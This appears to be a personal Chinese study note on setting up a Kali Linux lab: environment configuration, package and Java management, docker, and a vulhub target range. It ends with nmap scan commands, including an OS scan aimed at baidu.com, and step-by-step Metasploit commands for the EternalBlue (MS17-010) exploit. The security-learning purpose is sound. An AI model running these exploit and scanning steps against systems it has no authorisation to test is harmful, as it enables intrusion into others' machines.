#### Kali官网：www.kali.org

下载虚拟机版本——Virtual Machine——VMware



- 查看版本：cat /proc/version

- 汉化：
  - sudo dpkg-reconfigure locales
  - 设置 zh_CN
  - reboot

- 网络设置

  - 桥接模式：虚拟机和物理机处于同一WiFi或局域网下 ，IP不稳定 （校园拨号上网不建议用）
  - NAT模式：虚拟交换机，独立网段，IP稳定
  - 仅主机：独立网段，无法上网，只能和物理机通信

- LinuxEnvConfig配置

  - 下载配置脚本：git clone -b v1 https://gitee.com/yijingsec/LinuxEnvConfig.git
  - 进入脚本目录：cd LinuxEnvConfig
  - 管理员权限运行脚本：sudo bash LinuxEnvConfig.sh

- Kali修改密码：passwd kali

- 切换权限：sudo

- 软件管理

  - 安装：sudo apt -y install vim

  - 卸载（保留配置）：sudo apt remove 软件名

  - 彻底卸载（删除配置）：sudo apt purge 软件名

  - 查看apt源：cat /etc/apt/sources.list

  - 更新软件源列表：sudo apt update

  - 升级所有可更新软件：sudo apt upgrade

  - 搜索软件：apt search 关键词

  - 换源

    - sudo bash LinuxEnvConfig.sh     

    - 选择apt配置
    - vi /etc/apt/sources.list
    - 修改保存

- 切换Java版本

  - 列出所有安装的Java版本：update-alternatives --list java
  - 配置Java版本：sudo update-alternatives --config java
  - 选择需要使用的版本
  - Java真实安装路径：readlink -f /usr/bin/java

- 安装Java

  - apt或官网下载：sudo apt-get install openjdk-8-jre
  - 创建安装目录：sudo mkdir -p /usr/lib/jvm
  - 解压到目录：sudo tar -zxvf openjdk-8u482-b08-linux-x64.tar.gz -C /usr/lib/jvm/
  - 删除安装包：rm openjdk-8u482-b08-linux-x64.tar.gz
  - 重命名：mv openjdk-8u482-b08-linux-x64 java-8-openjdk-amd64
  - 创建软链接：sudo ln -s java-8-openjdk-amd64 java-1.8.482-openjdk-amd64
  - 更细系统版本管理：sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/java-8-openjdk-amd64/bin/java 300

- conda管理Python

  - 官网下载sh文件

  - bash Miniconda3-latest-Linux-aarch64.sh
  - yes enter  yes
  - 安装在/home/kali/miniconda3
  - 查看版本：conda -V
  - 列出python版本：conda env list
  - 安装python：conda create -n py39 python=3.9
    - conda activate py39
    - conda deactivate

- pip安装库

  - 安装单个库：pip install pwntools -i https://mirrors.ustc.edu.cn/pypi/web/simple
  - 批量(项目自带requirments.txt)：pip install -r requirments.txt -i https://pypi.douban.com/simple/ 

- SSH远程登录

  - sudo bash LinuxEnvConfig.sh
  - 基础配置
    - 启用root用户
    - 启用ssh服务
    - 允许root用户ssh登录

  - Windows cmd：root@192.168.13.131
  - WindTrem：ssh  账户

- 安装docker

  - sudo bash LinuxEnvConfig.sh
  - 选择docker

- 安装docker-compose

  - sudo bash LinuxEnvConfig.sh
  - 选择docker-compose

- 搭建靶场

  - git clone https://gitee.com/yijingsec/vulhub.git

- docker-compose

  - 进入docker-compose.yml文件目录

  - 启动：docker-compose up -d
  - 删除：docker-compose down

- 

- 

- 

- 









扫描网站终端类型：sudo nmap www.baidu.com -O



##### 经典漏洞--永恒之蓝(MS17-010)：

1. 提权
   - sudo su
2. 启动msf
   - msfconsole
3.  搜索永恒之蓝
   - search ms17_010
4.  使用模块
   - use exploit/windows/smb/ms17_010_eternalblue
   - use 0
5.  设置必选项
   -  show options
   -  set RHOSTS 192.168.1.133
   - set lport 10001
6. 运行模块
   - run



### kali常用工具：

- nmap：
  - 高速扫描：nmap -T4 -Pn 192.168.1.1
  - 全端口扫描：nmap -p- 192.168.1.1
  - 操作系统识别：nmap -O 192.168.1.1
- Znmap:
  - 
- 
  - 

<h4>meterpreter:后渗透模块


















win7专业版：
ed2k://|file|cn_windows_7_professional_x64_dvd_x15-65791.iso|3341268992|3474800521D169FBF3F5E527CD835156|/